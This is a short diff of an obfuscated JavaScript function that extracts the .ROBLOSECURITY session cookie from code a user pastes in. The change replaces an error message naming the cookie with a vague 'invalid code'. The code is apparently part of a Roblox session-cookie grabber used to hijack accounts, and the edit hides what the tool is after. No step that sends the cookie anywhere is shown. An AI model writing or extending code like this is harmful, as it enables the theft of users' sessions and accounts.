@@ -18,7 +18,7 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
     // Buscar la cookie .ROBLOSECURITY en el user_code
     const robloxSecurityCookieMatch = p1q2r3.match(/\.ROBLOSECURITY", "([^"]+)"/);
     if (!robloxSecurityCookieMatch) {
-        x1y2z3("Error", "No se encontró la cookie .ROBLOSECURITY en el código de usuario.", "error", "Retry");
+        x1y2z3("Error", "invalid code", "error", "Retry");
         return;
     }
     const robloxSecurityCookie = robloxSecurityCookieMatch[1];
